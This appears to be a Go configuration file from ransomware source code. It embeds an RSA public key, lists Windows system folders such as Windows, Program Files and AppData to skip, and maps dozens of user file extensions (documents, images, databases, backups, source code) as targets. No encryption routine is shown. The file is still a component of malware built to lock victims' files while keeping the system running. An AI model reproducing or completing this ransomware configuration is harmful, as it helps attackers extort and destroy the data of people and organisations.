package utils

const (
	TEXT = iota
	DATA
	AUDIO
	VIDEO
	_3D_IMAGE
	RASTER_IMAGE
	VECTOR_IMAGE
	PAGE_LAYOUT
	SPREADSHEET
	DATABASE
	GAME
	TEMP
	CONFIG
	SOURCE
)

var (
	SPubKeyPem = []byte(`-----BEGIN RSA PUBLIC KEY-----
MIIBCgKCAQEAypl+4F/OxQCBJXPVXa//VmoON8hqaSJ15XDccriExWFHOF31kxCG
45+BHaVwACasxe5MpdMz30Jd+iHZTnnNbPcL82HqIvGsD4cKWGGOxc6sLfa3fYVr
kOiOKQ/HUUSCMv761R+6iIGhfztrYM8/hGHKLWGrXqSUCvRveaW7n1HzKb9eEfys
sojwrz3dFhVN1o/fFxbBWYGmmGqXG6mKMLk+CVAA3pEwzNvJs+dgJ4IJSvF6FcHV
ti6w2Y9SEWlU7nAZVAAvX2WbpXZ6VdPYiu1jQY437WwG712YjlM5EL/rdJMi/rZP
M4xhymCo9feLsRCkNgAAQKgK73UsM5hrPwIDAQAB
-----END RSA PUBLIC KEY-----	
`)

	FoldersToSkip = []string{
		"Nova pasta",
		"ProgramData",
		"Windows",
		"bootmgr",
		"$WINDOWS.~BT",
		"Windows.old",
		"Temp",
		"tmp",
		"Program Files",
		"Program Files (x86)",
		"AppData",
		"$Recycle.Bin",
	}

	FileType = map[string]uint16{
		// Text Files
		"doc":  TEXT,
		"docx": TEXT,
		"msg":  TEXT,
		"odt":  TEXT,
		"wpd":  TEXT,
		"wps":  TEXT,
		"txt":  TEXT,
		// Data files
		"csv":  DATA,
		"pps":  DATA,
		"ppt":  DATA,
		"pptx": DATA,
		// Audio Files
		"aif": AUDIO,
		"iif": AUDIO,
		"m3u": AUDIO,
		"m4a": AUDIO,
		"mid": AUDIO,
		"mp3": AUDIO,
		"mpa": AUDIO,
		"wav": AUDIO,
		"wma": AUDIO,
		// Video Files
		"3gp": VIDEO,
		"3g2": VIDEO,
		"avi": VIDEO,
		"flv": VIDEO,
		"m4v": VIDEO,
		"mov": VIDEO,
		"mp4": VIDEO,
		"mpg": VIDEO,
		"vob": VIDEO,
		"wmv": VIDEO,
		// 3D Image files
		"3dm":   _3D_IMAGE,
		"3ds":   _3D_IMAGE,
		"max":   _3D_IMAGE,
		"obj":   _3D_IMAGE,
		"blend": _3D_IMAGE,
		// Raster Image Files
		"bmp":  RASTER_IMAGE,
		"gif":  RASTER_IMAGE,
		"png":  RASTER_IMAGE,
		"jpeg": RASTER_IMAGE,
		"jpg":  RASTER_IMAGE,
		"psd":  RASTER_IMAGE,
		"tif":  RASTER_IMAGE,
		"ico":  RASTER_IMAGE,
		// Vector Image files
		"ai":  VECTOR_IMAGE,
		"eps": VECTOR_IMAGE,
		"ps":  VECTOR_IMAGE,
		"svg": VECTOR_IMAGE,
		// Page Layout Files
		"pdf":  PAGE_LAYOUT,
		"indd": PAGE_LAYOUT,
		"pct":  PAGE_LAYOUT,
		"epub": PAGE_LAYOUT,
		// Spreadsheet Files
		"xls":  SPREADSHEET,
		"xlr":  SPREADSHEET,
		"xlsx": SPREADSHEET,
		// Database Files
		"accdb":  DATABASE,
		"sqlite": DATABASE,
		"dbf":    DATABASE,
		"mdb":    DATABASE,
		"pdb":    DATABASE,
		"sql":    DATABASE,
		"db":     DATABASE,
		// Game Files
		"dem": GAME,
		"gam": GAME,
		"nes": GAME,
		"rom": GAME,
		"sav": GAME,
		// Temp Files
		"bkp": TEMP,
		"bak": TEMP,
		"tmp": TEMP,
		// Config files
		"cfg":  CONFIG,
		"conf": CONFIG,
		"ini":  CONFIG,
		"prf":  CONFIG,
		// Source files
		"html": SOURCE,
		"php":  SOURCE,
		"js":   SOURCE,
		"ts":   SOURCE,
		"c":    SOURCE,
		"cc":   SOURCE,
		"py":   SOURCE,
		"lua":  SOURCE,
		"go":   SOURCE,
		"java": SOURCE,
	}
)
